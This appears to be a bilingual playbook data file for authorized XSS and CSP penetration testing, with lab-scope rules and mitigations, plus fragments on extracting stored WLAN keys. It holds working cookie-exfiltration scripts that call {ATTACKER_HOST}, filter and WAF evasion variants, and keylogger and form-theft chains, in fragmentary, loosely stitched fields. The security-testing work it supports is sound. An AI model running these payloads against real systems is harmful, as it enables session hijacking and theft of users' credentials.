description.zh: 规避输出重定向与临时文件监控：在 PowerShell 管道内即时过滤 netsh 输出的密钥行，全程不落盘。成功判据：管道输出取得明文密钥且无临时文件产生。
description.en: Evades netsh output-channel monitoring by parsing inside the script via NativeWifi with no temp files. Success: the key is obtained in-memory with nothing written to disk.

description.zh: 列出 WLAN 配置文件；输出接口下全部配置文件名即枚举完成。
description.en: List WLAN profiles; all profile names printed for the interface completes enumeration.

execution.command: netsh wlan show profile name="{LAB_SSID}" key=clear

description.zh: 以 key=clear 显示指定配置文件口令；输出安全密钥明文即确认口令可本机提取。
description.en: Show the profile passphrase with key=clear; plaintext key material in the output confirms local extraction.

name.zh: XSS 会话 Cookie 窃取链

description.zh: 覆盖 XSS 场景下会话 Cookie 窃取链的验证：从 Image、Fetch 与 XMLHttpRequest 三种外传方式，到编码传输与完整利用脚本，用于确认注入点能否升级为会话劫持。
description.en: Covers validation of session-cookie theft chains in XSS scenarios: from Image, Fetch, and XMLHttpRequest exfiltration paths through encoded transport and full exploit scripts, confirming whether an injection point escalates to session hijacking.

overview.zh: 覆盖 XSS 会话 Cookie 窃取链的完整验证：Image、fetch/sendBeacon、XMLHttpRequest 三种外传通道，Base64 编码传输与收集 Cookie/页面地址/UA 的完整利用脚本。用于确认注入点能否升级为会话劫持并量化可窃取面。
overview.en: Covers end-to-end verification of the XSS session-cookie theft chain: Image, fetch/sendBeacon, and XMLHttpRequest exfiltration channels, Base64-encoded transport, and a full exploit script collecting cookie, page URL, and UA. Used to confirm whether an injection point escalates to session hijacking and to quantify the stealable surface.

vulnerability.zh: 根因是 Cookie 缺少 HttpOnly 标志且存在可执行 XSS，脚本可读取 document.cookie 并经任意请求外传；Secure 与 SameSite 不影响脚本读取，非 HttpOnly 的会话值即可被完整取走。
vulnerability.en: The root cause is cookies missing the HttpOnly flag combined with executable XSS: scripts read document.cookie and exfiltrate it over arbitrary requests; Secure and SameSite do not affect script reads, so any non-HttpOnly session value is fully stealable.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步以 Image 请求把 cookie 发往 {ATTACKER_HOST}，收集端收到 c 参数即确认基础窃取链；第 2 步 fetch/sendBeacon 与第 3 步 XHR 验证多通道可用；第 4 步 Base64 编码后外发，收集端解码还原即确认编码传输；第 5 步外发 cookie、页面地址与 UA 完整参数集。被 WAF 拦截时改用混淆绕过变体。
exploitation.en: Use in Payload list order: step 1 sends the cookie to {ATTACKER_HOST} via an Image request; the collector receiving the c parameter confirms the basic theft chain. Step 2 (fetch/sendBeacon) and step 3 (XHR) verify multi-channel availability; step 4 sends Base64-encoded values with the collector decoding them, confirming encoded transport; step 5 exfiltrates the full cookie, page URL, and UA parameter set. When blocked by a WAF, switch to the obfuscation variant.

mitigation.zh:
全部会话 Cookie 设置 HttpOnly 并配合 Secure 与 SameSite，同步按上下文编码修复 XSS 注入点：
      # Spring Boot application.properties
      server.servlet.session.cookie.http-only=true
      server.servlet.session.cookie.secure=true
      server.servlet.session.cookie.same-site=lax
      # PHP
      ini_set('session.cookie_httponly', '1');
      ini_set('session.cookie_secure', '1');
  修复后重放三条外传通道脚本，收集端应无任何请求，document.cookie 返回值不含会话凭据。
mitigation.en: Set HttpOnly on all session cookies together with Secure and SameSite, and fix XSS injection points in parallel (context encoding plus CSP); after the fix, replaying each channel script must produce no collector requests, and document.cookie must not contain session credentials.

title.en: Exfiltrate cookies with an Image object

description.zh: 注入以新建图片请求拼接 document.cookie 的脚本，图片加载请求把 Cookie 带往控制端，日志命中即完成窃取。
description.en: Inject a new Image().src beacon that appends document.cookie; the image request carries the cookie to the collector's log.

description.zh: 改用 fetch 或浏览器信标接口发送 Cookie，后者在页面关闭后仍保证送达，显著提高外带动作的可靠性。
description.en: Switch to fetch or navigator.sendBeacon; the beacon API delivers even after page close for reliable exfiltration.

title.en: Encode with base64 to dodge inspection

description.zh: 先对 Cookie 做 base64 编码再外带，请求内容不再呈现明文口令特征，控制端收到后解码还原原始会话凭据使用。
description.en: btoa-encode the cookie before sending so plaintext signatures vanish; decode server-side to restore the session secrets.

title.zh: 完整脚本携带环境信息
title.en: Ship full context with the payload

description.zh: 用完整利用脚本同时外带 Cookie、页面地址与 UA 三项信息，凭据与来源绑定，便于精准复用会话仿冒受害者操作。
description.en: Run the full script exfiltrating cookie, location, UA and timestamp together so credentials pair with origin for precise session reuse.

attackChain.payload:
<script>
var img = new Image();
img.src = "http://{ATTACKER_HOST}/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>

title.en: Use the obfuscated build when filtered

description.zh: 脚本被关键字过滤拦截时改用变量名混淆版本，把 "cookie" 收进变量再经 document[变量] 取值，调用特征被打散，外带逻辑保持不变继续收数据。
description.en: When keyword filters block the script, switch to the hex-obfuscated build whose encoded names evade matching with logic intact.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 XSS 会话 Cookie 暴露验证 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for XSS Session-Cookie Exposure Validation are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: XSS 会话 Cookie 暴露验证只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Session-Cookie Exposure Validation is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: Cookie 外带验证只用合成会话——真实会话 Cookie 不进入载荷；收集端在验证后立即清空。
opsecTips.en: Use synthetic sessions for cookie-theft checks — never place real session cookies in payloads, and purge the collector immediately after verification.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.zh: 以变量混淆构造外发；收集端仍收到 cookie 即确认混淆不影响执行。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Build the exfil with variable obfuscation; the cookie still arriving at the collector confirms obfuscation does not break execution. {ATTACKER_HOST} renders to your collection server.

explanation.zh: 十六进制风格变量名混淆字符串"cookie"
eval执行字符串形式的外带语句
方括号语法动态取document.cookie，绕过点号检测
explanation.en: Bracket access evades dot notation detection

description.zh: 以 Image 请求把 cookie 发往收集端；收集端收到 c 参数中的 cookie 即确认基础窃取链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Send the cookie to the collector via an Image request; the cookie arriving in the c parameter confirms the basic theft chain. {ATTACKER_HOST} renders to your collection server.

description.zh: 以 fetch 与 sendBeacon 两种 API 外发 cookie；收集端收到两种请求即确认两个通道均可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Exfiltrate the cookie via fetch and sendBeacon; both requests arriving at the collector confirm both channels work. {ATTACKER_HOST} renders to your collection server.

explanation.en: Describes how the function segment "fetch()" participates in this validation command.

explanation.zh: 异步发送数据，不阻塞页面
explanation.en: Describes how the function segment "sendBeacon()" participates in this validation command.

execution.command:
<script>
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://{ATTACKER_HOST}/steal?c="+document.cookie, true);
xhr.send();
</script>

description.zh: 以 XHR GET 外发 cookie；收集端收到请求即确认 XHR 通道可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Exfiltrate the cookie via an XHR GET; the request arriving at the collector confirms the XHR channel. {ATTACKER_HOST} renders to your collection server.

description.zh: Base64 编码后以 Image 外发；收集端解码 c 参数还原出 cookie 即确认编码传输可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Base64-encode the cookie and exfiltrate via Image; decoding the c parameter at the collector restoring the cookie confirms encoded transport. {ATTACKER_HOST} renders to your collection server.

execution.command:
<script>
var img = new Image();
img.src = "http://{ATTACKER_HOST}/log?cookie=" + encodeURIComponent(document.cookie) + "&location=" + encodeURIComponent(location.href) + "&ua=" + encodeURIComponent(navigator.userAgent);
</script>

description.zh: 收集 cookie、页面地址与 UA 三项信息外发；收集端收到完整参数集即确认信息收集链可用。{ATTACKER_HOST} 渲染为自有收集服务器。
description.en: Collect cookie, page URL, and user agent and exfiltrate them; the full parameter set arriving at the collector confirms the information-gathering chain. {ATTACKER_HOST} renders to your collection server.

explanation.en: Create Image object for GET request

explanation.zh: 读取Cookie并URL编码后作为查询参数
当前页面地址一并编码外带
浏览器UA信息一并编码外带
构造图片请求地址触发外带

name.zh: CSP 回归与脚本来源审计

description.zh: 覆盖 CSP 策略弱点的验证与利用：从响应头基线与 unsafe-inline/unsafe-eval 求值，到白名单域 JSONP 回调与 Angular 表达式执行，再到 Cookie 外带，并附 base 注入与 Nonce 窃取。
description.en: Covers validation and exploitation of weak CSP policies: from response-header baseline and unsafe-inline/unsafe-eval evaluation through whitelisted-domain JSONP callbacks and Angular expression execution to cookie exfiltration, with base injection and nonce theft.

subCategory.zh: 信任脚本源与回调滥用

overview.zh: 覆盖 CSP 策略弱点的逐项验证：unsafe-inline/unsafe-eval 下直接执行，白名单域 JSONP 回调与 Angular 表达式利用策略缺口，img onerror 外带 Cookie，并附 base 注入与 Nonce 窃取变体。适用于评估现有 CSP 强度的场景。
overview.en: Covers item-by-item verification of CSP policy weaknesses: direct execution under unsafe-inline/unsafe-eval, JSONP callbacks on allowlisted domains and Angular expressions exploiting policy gaps, cookie exfiltration via img onerror, plus base-injection and nonce-theft variants. Suitable for assessing the strength of an existing CSP.

vulnerability.zh: 根因是 CSP 配置存在缺口：允许 unsafe-inline/unsafe-eval、白名单域上存在 JSONP/Angular 等可滥用端点、img-src 未收紧或 base-uri 未限制；策略缺口使注入脚本绕过脚本来源限制执行。
vulnerability.en: The root cause is gaps in CSP configuration: unsafe-inline/unsafe-eval allowed, exploitable endpoints like JSONP/Angular present on allowlisted domains, img-src and base-uri unrestricted; these gaps let injected scripts bypass script-origin restrictions and execute.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步读取目标 CSP 响应头作为基线；允许 unsafe-inline 时用第 2 步直注，允许 unsafe-eval 时用第 3 步 eval/setTimeout 执行；第 4 步把 allowed-domain.com 替换为策略实际白名单域借 JSONP 回调执行；第 5 步用 Angular orderBy 链在禁 inline/eval 的策略下触发；第 6 步以 img onerror 把 Cookie 拼入 {ATTACKER_HOST} URL 外带。被拦截时参考 base 注入与 Nonce 窃取变体。
exploitation.en: Use in Payload list order: step 1 reads the target CSP header as a baseline; under unsafe-inline inject directly with step 2, under unsafe-eval execute via eval/setTimeout with step 3; step 4 replaces allowed-domain.com with the policy's actual allowlisted domain to execute via a JSONP callback; step 5 triggers through the Angular orderBy chain when inline/eval are blocked; step 6 concatenates cookies into a {ATTACKER_HOST} URL via img onerror for exfiltration. When blocked, see the base-injection and nonce-theft variants.

mitigation.en: Adopt a strict nonce/hash-based CSP, remove unsafe-inline/eval, tighten img-src/connect-src/base-uri, and audit JSONP endpoints on allowlisted domains; after the fix, replayed payloads must be blocked by CSP and generate violation reports.

title.zh: 分析 CSP 头策略面

description.zh: 抓取响应中的 Content-Security-Policy 头，逐条解读 default-src、script-src 指令与白名单域，找出宽松配置点。
description.en: Capture the Content-Security-Policy header and parse default-src, script-src and whitelisted origins to spot lax directives.

description.zh: script-src 含 unsafe-inline 说明内联脚本被放行，直接提交 script 标签即可执行，无需任何额外绕过构造。
description.en: An unsafe-inline in script-src permits inline scripts, so a plain script tag executes without any bypass construction.

title.zh: 白名单域 JSONP 回调执行

description.zh: 白名单域存在 JSONP 端点时，以 script src 引入并把执行代码写进 callback 参数，脚本来源合法故 CSP 放行执行。
description.en: Point a script tag at a whitelisted JSONP endpoint with the payload as the callback; the trusted origin passes CSP and runs the code.

description.zh: 页面引入 Angular 时用 ng-focus 触发 orderBy 链构造表达式，从原型链拿到构造函数执行任意代码，无需新增脚本源。
description.en: On Angular pages, ng-focus plus orderBy chains abuse the prototype chain to execute code without adding any script source.

title.zh: base 注入劫持相对路径
title.en: Hijack relative paths with base injection

description.zh: 插入 base 标签改写相对路径解析基准，页面后续加载的相对脚本转向控制端服务器，并可借 CSS 选择器外带 nonce。
description.en: Inject a base tag so later relative script loads resolve to the attacker host, while CSS selectors can leak script nonces.

review.rationale: v2.0.2 数据治理：描述/opsec/前置条件差异化重写

prerequisites.zh: 确认 CSP 回归与脚本来源审计 的目标、账号、数据、组件版本和停止条件均属于可回滚的授权实验范围。
prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for CSP Regression and Script-Source Audit are inside a reversible authorized lab scope.

prerequisites.zh: 准备正常输入、唯一标记、服务端日志和阴性对照；禁止扩展到非实验资产、真实凭据或不可回滚状态。
prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: CSP 回归与脚本来源审计只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: CSP Regression and Script-Source Audit is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

opsecTips.zh: CSP 回归中的 JSONP/Angular 载荷会执行外部取数——全部指向实验端点；Cookie 外带验证使用合成 Cookie。
opsecTips.en: JSONP and Angular payloads fetch external resources — point them at lab endpoints, and use synthetic cookies for exfiltration checks.

opsecTips.zh: 出现真实凭据、非实验数据、不可逆写入或非授权连接时立即停止并清理夹具。
opsecTips.en: Stop immediately and clean up the fixture on real credentials, non-lab data, irreversible writes, or unauthorized connections.

description.en: Rewrite the base URL when base-uri is unrestricted and steal the script nonce bit by bit with a CSS attribute selector; relative-resource requests reaching {ATTACKER_HOST} plus per-prefix nonce guess requests confirm both bypass paths.

description.zh: 绕过对 <script src= 字面特征的匹配：import() 不出现 src= 字样即发起模块加载（仍受目标 CSP script-src 约束，需该源在白名单内）。判据：evil.js 模块被加载并执行。
description.en: Module import avoids static script-src signatures. Success: module executes.

description.zh: 绕过 src= 特征：由库函数动态加载。判据：脚本执行。
description.en: Library-level loader avoids src= signatures. Success: script runs.

description.zh: 绕过大小写敏感的标签与路径规则。判据：资源加载成功。失效条件：现代 WAF/现代解析器归一化后普遍失效，仅对自研大小写敏感检测成立。与 V6 仅差标签与文件名大小写；EvIl.Js 在大小写敏感的 Linux 静态资源上还会 404，「资源加载成功」判据可能假阴。
description.en: Mixed case in both tag and URL. Success: resource loads.Failure condition: broadly dead once modern WAFs and modern parsers normalize; only effective against bespoke case-sensitive detection. Differs from V6 only in tag and filename casing; EvIl.Js also risks a 404 on case-sensitive Linux static hosting, so the resource-loaded criterion can false-negative.

description.zh: 以协议相对 URL 加载外部脚本；网络请求到达 {ATTACKER_HOST} 并设置内存标记即确认外部脚本源信任边界。{ATTACKER_HOST} 渲染为只返回设置内存标记脚本的自有测试域，记录 CSP 报告、网络请求与 DOM，不要加载第三方代码。
description.en: Load an external script via a protocol-relative URL; the request reaching {ATTACKER_HOST} and setting an in-memory marker confirms the external-script trust boundary. {ATTACKER_HOST} renders to your own test origin serving only a marker script — record CSP reports, network requests, and DOM, never load third-party code.

title.zh: 样例 CSP 响应头基线

description.zh: 给出仅允许 self 与指定 CDN 的 CSP 响应头，作为后续各绕过样例的对照基线。
description.en: Shows a CSP header allowing only self and one CDN, serving as the baseline for the following bypass samples.

description.zh: 在允许 unsafe-inline 的 CSP 下直接内联执行脚本；alert 弹出即确认宽松策略可被直接利用。
description.en: Run an inline script under a CSP allowing unsafe-inline; the alert firing confirms permissive policy is directly exploitable.

orderBy 过滤器对表达式求值

name.zh: DOM XSS 源到汇检测

description.zh: 覆盖 DOM XSS 的源到汇路径验证：从 Hash 与查询参数源注入，到常见 Sink 点与完整利用 URL 构造，再到 postMessage 源注入，并附 javascript: 协议与 SVG 标签绕过变体。
description.en: Covers DOM XSS source-to-sink path validation: from hash and query-parameter source injection through common sink points and full exploit URL construction to postMessage source injection, with javascript: protocol and SVG tag bypass variants.

overview.zh: 覆盖 DOM XSS 的源到汇路径验证：location.hash/search 与 postMessage 等源进入 document.write/innerHTML/eval 等危险汇，并构造完整利用 URL 确认端到端触发。适用于前端把 URL 数据写入 DOM 而无服务端参与的场景。
overview.en: Covers source-to-sink verification for DOM XSS: location.hash/search and postMessage sources flowing into hazardous sinks such as document.write/innerHTML/eval, plus a full exploit URL confirming end-to-end triggering. Suitable when frontend code writes URL data into the DOM without server involvement.

vulnerability.zh: 根因是前端脚本把 location、postMessage 等不可信源未经净化写入 innerHTML、document.write、eval 等执行性 DOM 汇；源到汇之间缺少编码或安全 API 替代即构成可触发的执行路径。
vulnerability.en: The root cause is frontend scripts writing untrusted sources such as location and postMessage into executable DOM sinks like innerHTML, document.write, and eval without sanitization; the lack of encoding or a safe-API substitute between source and sink forms a triggerable execution path.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步把载荷分别放入 location.hash 与 location.search 观察是否触发；第 2 步对照 document.write、innerHTML、eval、setTimeout、jQuery html 等汇点确认可达数据流；第 3 步打开携带 hash 载荷的完整 {LAB_APP} URL，弹窗即确认端到端触发；第 4 步用 postMessage 注入 img 载荷验证消息源。被拦截时改用 javascript: 协议或 SVG/MathML 变体。
exploitation.en: Use in Payload list order: step 1 places payloads into location.hash and location.search to see if they trigger; step 2 checks reachable flows against sinks like document.write, innerHTML, eval, setTimeout, and jQuery html; step 3 opens the full {LAB_APP} URL carrying the hash payload, with the popup confirming end-to-end triggering; step 4 injects an img payload via postMessage to verify the message source. When blocked, switch to javascript: protocol or SVG/MathML variants.

mitigation.en: Replace hazardous DOM sinks with safe APIs like textContent, validate postMessage origin and data shape, and adopt Trusted Types plus CSP; after the fix, replaying payloads from each source must leave no executable nodes in the DOM.

title.zh: hash 与参数注入探测源
title.en: Probe sources via hash and query injection

description.zh: 把载荷放进 URL hash 与查询参数后刷新页面，观察是否弹窗触发，确认 location 类源是否流入前端渲染路径。
description.en: Place payloads in the URL hash and query string and reload; alerts reveal whether location-derived sources reach rendering.

title.zh: 定位危险 sink 函数

description.zh: 审查页面脚本中 document.write、innerHTML、eval、setTimeout 与 jQuery html 调用，找到把源数据写进 DOM 的汇聚点。
description.en: Scan page scripts for document.write, innerHTML, eval, setTimeout and jQuery html calls to find where source data lands in the DOM.

description.en: Combine the step 2 sink into a payload-bearing URL; the hash never reaches the server, bypassing server-side filters entirely.

description.zh: 向目标窗口 postMessage 发送载荷字符串，监听方未校验来源把数据写进 innerHTML，跨 iframe 场景同样触发执行。

prerequisites.en: Confirm that the target, accounts, data, component version, and stop conditions for DOM XSS Source-to-Sink Boundary are inside a reversible authorized lab scope.

prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.en: DOM XSS Source-to-Sink Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. A status code, timeout, error string, client display, or tool guess is only a lead; retain a negative control and exact version prerequisites.

description.zh: 绕过 URL 参数中的 scheme 检测：URL 编码的制表符被规范化剔除。判据：执行成功。失效条件：百分号编码的 %09 在 scheme 解析阶段尚未解码，% 使 scheme 非法，现代浏览器不执行且判据预期阴性；有效形态是字面 Tab/换行或经属性实体解码的 	（见 V0/V2）。
description.en: URL-encoded tab is stripped during scheme parsing. Success: executes.Failure condition: a percent-encoded %09 is not decoded yet at scheme-parse time and the % invalidates the scheme, so modern browsers never execute and the criterion expects a negative; the working forms are a literal Tab/LF or an entity-decoded 	 (see V0/V2).

description.zh: 绕过 alert 直接跟随的特征：注释填充改变形态。判据：弹窗。

innerHTML = location.search

description.en: Watch behavior after source data is written to common DOM sinks (document.write, innerHTML, eval, setTimeout, jQuery html); any sink firing confirms that data flow is reachable.

title.zh: 完整利用 URL 构造

description.en: Open the full URL carrying the hash payload; the page executing the payload per the sink logic (alert) confirms the URL-to-sink trigger path. {LAB_APP} renders to the target app host.

explanation.zh: 携带 hash 载荷的完整利用 URL
explanation.en: Full exploit URL carrying the hash payload

description.zh: 注册 message 监听把事件数据写入 innerHTML，再跨窗口 postMessage 注入 img 载荷，验证消息源到 Sink 的边界。
description.en: Registers a message listener that writes event data into innerHTML, then injects an img payload cross-window via postMessage to test the message-source-to-sink boundary.

explanation.zh: 消息数据写入 innerHTML 的 Sink
explanation.en: Sink writing message data into innerHTML

name.zh: XSS 多层解码绕过

description.zh: 覆盖多层解码顺序引发的 XSS 边界验证：从 URL、HTML 实体与 JavaScript 编码，到 CSS 编码与多层混合编码，并附双重 URL 编码与 UTF-16 变体，用于确认解码次序不一致时的过滤失效。
description.en: Covers XSS boundary validation driven by multi-layer decode order: from URL, HTML-entity, and JavaScript encoding through CSS and mixed multi-layer encoding, with double URL-encoding and UTF-16 variants, confirming filter failure when decode orders disagree.

overview.zh: 覆盖多层解码顺序引发的 XSS 边界验证：URL 编码、HTML 实体、JavaScript 编码、CSS expression 与多层混合编码五类样例，并附双重 URL 编码与 UTF-16 变体。用于确认解码次序不一致时过滤器失效的具体位置。
overview.en: Covers XSS boundary verification driven by multi-layer decoding order: five sample families (URL encoding, HTML entities, JavaScript encoding, CSS expression, and mixed multi-layer encoding) plus double-URL-encoding and UTF-16 variants. Used to pinpoint exactly where filters fail when decode orders diverge.

vulnerability.zh: 根因是请求在框架、应用与浏览器之间经历不同次数与顺序的解码，过滤器只在某一层匹配而执行发生在最后一层；多重解码或错误上下文编码会把被过滤的形态还原为可执行字符。
vulnerability.en: The root cause is requests undergoing different decode counts and orders across framework, application, and browser: the filter matches at only one layer while execution happens at the last; multiple decoding or wrong-context encoding restores filtered shapes into executable characters.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步提交 URL 编码标签，单层解码后执行即确认解码差异；第 2 步 HTML 实体、第 3 步 JS 十六进制/八进制/atob 编码、第 4 步 CSS expression（旧版 IE）、第 5 步多层混合编码逐层验证；记录每层解码结果定位失效层。被 WAF 拦截时改用双重 URL 编码与 UTF-16 变体。
exploitation.en: Use in Payload list order: step 1 submits URL-encoded tags; execution after one decode confirms the decoding differential. Steps 2-5 verify HTML entities, JS hex/octal/atob encoding, CSS expression (legacy IE), and mixed multi-layer encoding layer by layer; record each decoded layer to locate the failing one. When blocked by a WAF, switch to double-URL-encoding and UTF-16 variants.

mitigation.en: Decode deterministically exactly once at the application entry, encode output once for the final context, and reject double or ambiguous encodings; after the fix, replaying all encoding-layer samples must yield no executable content, with filter and application decode layers aligned.

title.zh: URL 编码穿透传输层过滤
title.en: Pass transport filters with URL encoding

description.zh: 对载荷做百分号 URL 编码提交，传输层设备看到的特征被稀释，服务端解码后原始标签进入页面渲染执行。
description.en: Percent-encode the payload so transport inspection sees diluted signatures while server-side decoding restores the raw tags.

title.zh: HTML 实体编码绕过输出过滤
title.en: Bypass output filters with HTML entities

description.zh: 把关键字符改写为十进制或十六进制实体提交，输出侧防御被绕开，浏览器渲染时实体解码回标签与代码触发执行。
description.en: Rewrite key characters as decimal or hex entities so output-side defenses pass them and the browser decodes them back to tags.

title.zh: JS 编码与 atob 执行
title.en: Execute via JS encodings and atob

description.zh: 属性值内用转义序列或 atob 解码 base64 字符串再执行，函数名字面量消失，解码后动态运行任意攻击语句。
description.en: Inside attribute values use \u escapes or eval(atob(...)) so literal names vanish and arbitrary statements run after decoding.

title.en: Combine mixed encodings to break through

description.zh: 把实体编码的函数名放进属性、链接协议部分同样用实体书写，多层解码顺序被利用，各层过滤均无法还原完整特征。
description.en: Mix entity-encoded handlers with entity-written URLs; layered decoding order defeats each filter's view of the payload.

title.zh: 双重编码与 UTF-16 变体

prerequisites.en: Prepare normal input, a unique marker, server logs, and a negative control; do not expand to non-lab assets, real credentials, or irreversible state.

analysis.zh: XSS 多层解码边界只有在唯一输入、最终解析或授权结果、服务端日志和可观察影响相互一致时才能确认。单一状态码、超时、错误文本、客户端显示或工具猜测只应作为线索，必须保留阴性对照和版本条件。
analysis.en: XSS Multi-Stage Decoding Boundary is confirmed only when the unique input, final parsing or authorization result, server-side logs, and observable impact agree. name.zh: XSS 过滤与规范化差异

description.zh: 覆盖 XSS 过滤器的规范化差异绕过：从大小写混淆、双写与注释混淆，到空字节截断与标签属性变形，再到事件处理器变体，并附 Data URI 与 SVG 动画绕过，用于逐项定位过滤规则缺口。
description.en: Covers filter normalization-differential bypasses for XSS: from case obfuscation, doubling, and comment confusion through null-byte truncation and tag-attribute mutations to event-handler variants, with Data URI and SVG animation bypasses, locating filter-rule gaps item by item.

overview.zh: 覆盖 XSS 过滤器的规范化差异绕过：大小写混淆、关键字双写、注释混淆、空字节截断、标签属性空白变形与冷门事件处理器六类变体，用于逐项定位过滤规则缺口。适用于目标存在关键字黑名单或简单过滤器的场景。
overview.en: Covers normalization-differential bypasses of XSS filters across six variant families: case mixing, keyword double-writes, comment obfuscation, null-byte truncation, tag/attribute whitespace mutations, and uncommon event handlers, used to locate filter gaps item by item. Suitable when the target runs keyword blacklists or simple filters.

vulnerability.zh: 根因是过滤器按字面形态匹配关键字，未考虑大小写折叠、一次删除、注释分词、空字节与空白规范化等解析差异；黑名单漏掉的冷门事件处理器也保持可执行，规则缺口即注入通道。
vulnerability.en: The root cause is filters matching keywords by literal shape, ignoring parsing differentials such as case folding, single-pass deletion, comment tokenization, null bytes, and whitespace normalization; uncommon event handlers missing from the blacklist stay executable, and rule gaps become injection channels.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步大小写混淆提交，仍执行即确认过滤按大小写敏感的字面匹配（未做大小写折叠）；第 2 步双写关键字，删除后拼回有效标签执行即确认单次删除可绕过；第 3 步注释插入、第 4 步空字节截断、第 5 步制表/换行变形属性逐一验证；第 6 步用 onpageshow/onstart/ontoggle 等冷门事件确认黑名单覆盖不全。仍被拦截时改用 Data URI 或 SVG 动画绕过。
exploitation.en: Use in Payload list order: step 1 submits case-mixed payloads — execution proves the filter is case-insensitive; step 2 double-writes keywords — execution after deletion reassembles a valid tag, proving single-pass deletion bypass; steps 3-5 verify comment insertion, null-byte truncation, and tab/newline attribute mutations one by one; step 6 uses uncommon handlers like onpageshow/onstart/ontoggle to prove incomplete blacklist coverage. If still blocked, switch to Data URI or SVG-animation bypasses.

mitigation.en: Drop keyword blacklists in favor of context-appropriate output encoding and a maintained sanitizer allowlist, decoding uniformly before inspection; after the fix, replaying all six variant families must show no executable differentials, with allowlists kept current for new event attributes.

title.zh: 大小写混淆绕过黑名单

description.zh: 把标签与属性写成混合大小写，按大小写敏感匹配的黑名单漏检，而 HTML 解析不区分大小写，载荷照常执行。
description.en: Mix case across tags and attributes; case-sensitive blacklists miss them while the case-insensitive HTML parser still executes.

description.zh: 过滤器只删除一遍关键字时提交双写形态载荷，删除内层后剩余字符恰好拼回完整标签名，载荷恢复执行能力继续利用。
description.en: Submit scrscriptipt-style double writes; after one deletion pass the leftovers reassemble the original tag name.

description.zh: 在脚本体与事件属性值内的 JS 代码中插入注释（如 alert/**/(1)）打断连续特征串，浏览器执行时忽略注释内容，语句恢复完整语义执行；标签属性之间插注释在现代浏览器不生效，不要作为主向量。
description.en: Interleave /**/ or fake comments between tokens; long signatures shatter while the parser ignores comments and restores semantics.

title.en: Cut matching short with null bytes

description.zh: 在关键字内部插入空字节，按字节串匹配的过滤器失效，解析器遇空字节截断，前缀恰好还原出可执行标签继续运行。
description.en: Insert null bytes inside keywords; byte-oriented matchers fail while parsers truncate at the null and still honor the tag.

name.zh: XSS 键盘记录与表单窃取

description.zh: 覆盖 XSS 的输入事件收集链验证：从基础与完整键盘记录脚本，到表单数据窃取与表单提交劫持，用于确认注入点能否持续捕获用户击键与凭据输入。
description.en: Covers validation of input-event collection chains via XSS: from basic and full keylogger scripts through form-data theft and submit hijacking, confirming whether an injection point can persistently capture user keystrokes and credential input.

overview.zh: 覆盖 XSS 输入事件收集链的验证：基础 keypress 监听、缓冲整行外发、密码字段 change 窃取与表单提交劫持四种形态。用于确认注入脚本能否持续捕获用户击键与凭据输入。
overview.en: Covers verification of the XSS input-event collection chain across four forms: basic keypress listeners, buffered full-line exfiltration, password-field change theft, and form-submit hijacking. Used to confirm whether injected scripts can continuously capture keystrokes and credential input.

vulnerability.zh: 根因是注入脚本可注册页面级事件监听并访问表单字段值，keydown/change/submit 事件对脚本完全开放；脚本存活期间击键与表单数据持续外传，影响覆盖注入页面上的全部用户输入。
vulnerability.en: The root cause is injected scripts registering page-level event listeners and reading form field values: keydown/change/submit events are fully open to script. While the script lives, keystrokes and form data keep flowing out, covering every user input on the injected page.

exploitation.zh: 按 Payload 列表顺序使用：第 1 步注入 keypress 监听外发击键，收集端按 key 参数收到按键流即确认基础记录链；第 2 步缓冲击键并在 Enter 时整段外发验证完整记录；第 3 步监听密码字段 change 外发字段值；第 4 步劫持 form submit 外发完整表单数据。收集端指向 {ATTACKER_HOST} 自有服务器；被 WAF 拦截时改用混淆版本。
exploitation.en: Use in Payload list order: step 1 injects a keypress listener exfiltrating keystrokes; the collector receiving the keystroke stream via the key parameter confirms the basic chain. Step 2 buffers keystrokes and sends the full line on Enter; step 3 listens on password-field change events to exfiltrate field values; step 4 hijacks form submit to exfiltrate the complete form data. Point the collector at your own {ATTACKER_HOST} server; when blocked by a WAF, switch to the obfuscated version.

